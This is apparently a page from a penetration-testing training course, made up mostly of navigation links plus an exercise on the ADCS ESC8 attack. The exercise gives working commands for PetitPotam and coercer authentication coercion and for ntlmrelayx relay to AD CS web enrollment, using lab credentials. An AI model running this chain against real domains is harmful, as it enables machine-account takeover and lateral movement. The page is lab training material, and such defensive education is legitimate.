+    
+  
+    Exercise 6.2 -- MS-SQL Version and Instance Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/03_MSSQL_Manual_Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.3 -- MS-SQL Manual Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/04_MSSQL_Credential_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.4 -- MS-SQL Credential Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/05_MSSQL_Basic_Query_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.5 -- MS-SQL Basic Query Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/06_MSSQL_xp_cmdshell_Activation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.6 -- MS-SQL xp_cmdshell Activation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/07_MSSQL_File_System_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.7 -- MS-SQL File System Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/08_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH07 -- LDAP Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH07 -- LDAP Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/01_LDAP_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.1 -- LDAP Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/02_LDAP_Anonymous_Bind_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.2 -- LDAP Anonymous Bind Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/03_LDAP_Base_DN_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.3 -- LDAP Base DN Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/04_LDAP_User_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.4 -- LDAP User Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/05_LDAP_Group_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.5 -- LDAP Group Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/06_LDAP_Comprehensive_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 7.6 -- LDAP Comprehensive Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH07_LDAP_Enumeration/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH08 -- Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH08 -- Credential Reuse
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/01_Single_Service_Credential_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.1 -- Single Service Credential Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/02_Cross_Service_Credential_Reuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.2 -- Cross-Service Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/03_Multi_Service_Credential_Reuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.3 -- Multi-Service Credential Reuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/04_Credential_Discovery_and_Reuse_Chain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.4 -- Credential Discovery and Reuse Chain
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/05_CME_Credential_Reuse_Automation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 8.5 -- CME Credential Reuse Automation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH08_Credential_Reuse/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH09 -- Assessment
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH09 -- Assessment
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/01_Windows_Network_Assessment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.1 -- Windows Network Assessment
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/02_Multi_Service_Exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.2 -- Multi-Service Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/03_Complete_Windows_Penetration_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 9.3 -- Complete Windows Penetration Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH09_Assessment/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#esc8-choreography-in-one-picture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ESC8 Choreography in One Picture
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#coercer-decision-tree" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coercer Decision Tree
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-why-the-chain-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Why the Chain Works
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Why the Chain Works">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#coercion-ms-efsrpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coercion: MS-EFSRPC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#relay-ntlmrelayx-with-adcs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Relay: ntlmrelayx with --adcs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-machine-template-default" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Machine template default
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#why-the-iis-site-is-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why the IIS site is vulnerable
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ntlmrelayx-with-ad-cs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ntlmrelayx with AD CS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#coercer-multi-method-coercion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        coercer (multi-method coercion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#certipy-auth-from-a-machine-cert" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        certipy auth from a machine cert
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-confirm-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Confirm Targets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-start-the-relay-listener" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Start the Relay Listener
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-trigger-the-coercion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Trigger the Coercion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-recover-the-machine-tgt-and-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Recover the Machine TGT and Hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-read-the-per-token-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Read the Per-Token Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-47-adcs-esc8-ntlm-relay-to-web-enrollment">Exercise 4.7: ADCS ESC8 (NTLM Relay to Web Enrollment)</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>ESC8 chains three building blocks: (1) authentication coercion, (2) NTLM relay, (3) AD CS web enrollment with no Extended Protection for Authentication (EPA). PetitPotam (or a similar coercer) forces a target machine to authenticate to an attacker-controlled SMB endpoint; ntlmrelayx.py forwards that authentication to the IIS /certsrv enrollment page; the CA issues a certificate for the relayed machine; the attacker uses the cert to recover the machine's TGT and pivot.</p>
+<p>The PetitPotam-relay-AD-CS chain cost many teams a long weekend in summer 2021. Microsoft's KB5005413 added mitigations (EPA on IIS, signing requirements), but the default install of AD CS Web Enrollment on Windows Server 2016 / 2019 / 2022 still leaves the attack possible unless an administrator explicitly hardens.</p>
+<p>Exercise 4.7 gives you a PetitPotam-coerce-able machine <code>MSSQL01_&lt;TOKEN&gt;</code> and asks you to walk the full chain.</p>
+<p><strong>Tools required:</strong> <code>impacket-ntlmrelayx</code>, <code>PetitPotam.py</code> (or <code>coercer</code>), <code>certipy</code>. Pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "ESC8 is the chain that made everyone update their AD CS in 2021. NTLM relay was already a thing. Web enrollment was already a thing. Putting them together was the sentence that cost a lot of teams a long weekend."</p>
+<p>The flag is in <code>MSSQL01_&lt;TOKEN&gt;$</code>'s <code>extensionAttribute3</code>, readable by anyone authenticated as that machine account.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code> (some PetitPotam variants need an auth context)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code>
+<strong>CA:</strong> <code>corp-ca01</code> (web enrollment at <code>http://corp-ca01/certsrv/</code>)
+<strong>Victim:</strong> <code>MSSQL01_&lt;TOKEN&gt;</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Confirm <code>http://corp-ca01/certsrv/</code> is reachable</li>
+<li>Start <code>ntlmrelayx.py</code> with <code>--target http://corp-ca01/certsrv/certfnsh.asp --adcs --template Machine</code></li>
+<li>Coerce <code>MSSQL01_&lt;TOKEN&gt;$</code> to authenticate to your Kali via PetitPotam</li>
+<li>Save the relayed certificate as <code>machine.pfx</code></li>
+<li>Use <code>certipy auth</code> to recover the machine's TGT and NT hash</li>
+<li>Read <code>extensionAttribute3</code> on <code>MSSQL01_&lt;TOKEN&gt;</code> via LDAP</li>
+</ul>
+<h3 id="esc8-choreography-in-one-picture">ESC8 Choreography in One Picture</h3>
+<p>ESC8 is three loosely-coupled bugs in a row. The diagram below traces the auth and the cert across all four hosts.</p>
+<pre class="mermaid"><code>sequenceDiagram
+    autonumber
+    participant K as Kali (attacker)
+    participant V as MSSQL01_&lt;TOKEN&gt;&lt;br/&gt;(victim)
+    participant CA as IIS /certsrv&lt;br/&gt;(corp-ca01)
+    participant DC as KDC (corp-dc01)
+
+    Note over K: ntlmrelayx.py listens on TCP/445 + TCP/80
+    K-&gt;&gt;V: PetitPotam EfsRpcOpenFileRaw \\&lt;kali&gt;\share\f
+    V-&gt;&gt;K: SMB connect (Net-NTLMv2 of MSSQL01_&lt;TOKEN&gt;$)
+    K-&gt;&gt;CA: HTTP POST /certsrv/certfnsh.asp&lt;br/&gt;NTLM challenge/response RELAYED from V
+    CA--&gt;&gt;K: 200 OK&lt;br/&gt;certificate for MSSQL01_&lt;TOKEN&gt;$
+    Note over K: machine.pfx written to disk
+    K-&gt;&gt;DC: PKINIT AS-REQ with machine.pfx
+    DC--&gt;&gt;K: TGT for MSSQL01_&lt;TOKEN&gt;$&lt;br/&gt;(+ NTLM hash on un-hardened DCs)
+    Note over K: read extensionAttribute3 via LDAP-bind as machine</code></pre>
+<h3 id="coercer-decision-tree">Coercer Decision Tree</h3>
+<p>PetitPotam is the famous coercer but is partially patched in many environments. The flowchart below is the order to try when the easy path is blocked.</p>
+<pre class="mermaid"><code>flowchart TD
+    Start["Need to coerce &lt;victim&gt;"]
+    A["PetitPotam unauth"]
+    B{"Auth fired?"}
+    C["PetitPotam authed (-u/-p)"]
+    D{"Auth fired?"}
+    E["coercer (try all methods)"]
+    F{"Auth fired?"}
+    G["PrinterBug, ShadowCoerce,&lt;br/&gt;DFSCoerce variants individually"]
+    H["Stop -- victim is fully patched"]
+
+    Start --&gt; A --&gt; B
+    B -- "yes" --&gt; Done["Coercion succeeded"]
+    B -- "no" --&gt; C --&gt; D
+    D -- "yes" --&gt; Done
+    D -- "no" --&gt; E --&gt; F
+    F -- "yes" --&gt; Done
+    F -- "no" --&gt; G --&gt; Done</code></pre>
+<hr />
+<h2 id="background-why-the-chain-works">Background: Why the Chain Works</h2>
+<h3 id="coercion-ms-efsrpc">Coercion: MS-EFSRPC</h3>
+<p>The MS-EFSRPC protocol exists for legitimate Encrypting File System remote operations. It exposes RPC functions like <code>EfsRpcOpenFileRaw</code> that take a path argument. If you call the function with a path like <code>\\&lt;attacker_ip&gt;\share\file.txt</code>, the target server has to authenticate to <code>&lt;attacker_ip&gt;</code> to access that path. The authentication is performed by the LSA on behalf of the machine account; the credentials sent are the machine's own (Net-NTLM hash of the machine account password).</p>
+<p>PetitPotam (CVE-2021-36942) is the most famous tool for triggering MS-EFSRPC coercion. Variants like PrinterBug, ShadowCoerce, DFSCoerce, and several others use other RPC interfaces with the same overall effect: a target machine is forced to send a Net-NTLM authentication to an attacker-chosen IP.</p>
+<h3 id="relay-ntlmrelayx-with-adcs">Relay: ntlmrelayx with --adcs</h3>
+<p>Captured Net-NTLM authentications cannot be cracked back to a machine account password (machine passwords are 240 random bytes; uncrackable). Relay solves the problem by forwarding the authentication to a relay target instead of trying to crack it. The IIS /certsrv endpoint accepts NTLM authentication from any domain machine and lets that machine request a certificate. ntlmrelayx with <code>--adcs --template Machine</code> automates: receive the relayed auth, request a Machine-template cert as the authenticated identity, save the resulting cert.</p>
+<h3 id="the-machine-template-default">The Machine template default</h3>
+<p>The Machine template is published on every Enterprise CA by default. It allows Domain Computers to enroll, requires no manager approval, has the Client Authentication EKU, and binds the cert to the machine's identity. The combination of "any domain machine can enroll" + "the cert is for the machine's identity" + "the cert is good for client auth" is exactly what an attacker wants when they can relay machine authentication.</p>
+<h3 id="why-the-iis-site-is-vulnerable">Why the IIS site is vulnerable</h3>
+<p>The /certsrv IIS site historically did not require:
+- HTTPS (HTTP is enabled by default)
+- Channel Binding (Extended Protection for Authentication, "EPA")
+- SMB signing on the relay path (this protects relay TO SMB; HTTP relay has its own EPA story)</p>
+<p>Without HTTPS + EPA, NTLM authentications can be relayed from one channel (SMB inbound from the coerced victim) to another (HTTP outbound to /certsrv) without channel-binding mismatch. KB5005413 documents the hardening: enable HTTPS-only, enable EPA on IIS, configure RPC filters that block the coercion methods. Many environments are still partially mitigated.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="ntlmrelayx-with-ad-cs">ntlmrelayx with AD CS</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ntlmrelayx.py<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span>-t<span class="w"> </span>http://corp-ca01/certsrv/certfnsh.asp<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">  </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">  </span>-smb2support
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-t</code></td>
+<td>relay target URL (the /certsrv enrollment endpoint)</td>
+</tr>
+<tr>
+<td><code>--adcs</code></td>
+<td>request a certificate from the relayed authentication</td>
+</tr>
+<tr>
+<td><code>--template Machine</code></td>
+<td>use the Machine certificate template</td>
+</tr>
+<tr>
+<td><code>-smb2support</code></td>
+<td>accept SMB2 inbound (the coerced auth lands here)</td>
+</tr>
+</tbody>
+</table>
+<p>When a relay succeeds, ntlmrelayx writes the issued certificate to disk (PEM by default; <code>-output-file machine.pfx</code> for PFX format).</p>
+<h3 id="petitpotam">PetitPotam</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PetitPotam.py<span class="w"> </span>&lt;kali_ip&gt;<span class="w"> </span>mssql01_&lt;TOKEN&gt;.corp.nordport.local
+</code></pre></div>
+<p>Optional auth context (some variants need it on patched DCs):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>&lt;kali_ip&gt;<span class="w"> </span>mssql01_&lt;TOKEN&gt;.corp.nordport.local
+</code></pre></div>
+<p>Output: the target reaches out to <code>&lt;kali_ip&gt;</code> over SMB.</p>
+<h3 id="coercer-multi-method-coercion">coercer (multi-method coercion)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span>mssql01_&lt;TOKEN&gt;.corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-l<span class="w"> </span>&lt;kali_ip&gt;
+</code></pre></div>
+<p>Tries every coercion method in sequence. Useful when PetitPotam alone is patched but other variants (ShadowCoerce, DFSCoerce, PrinterBug) still work.</p>
+<h3 id="certipy-auth-from-a-machine-cert">certipy auth from a machine cert</h3>
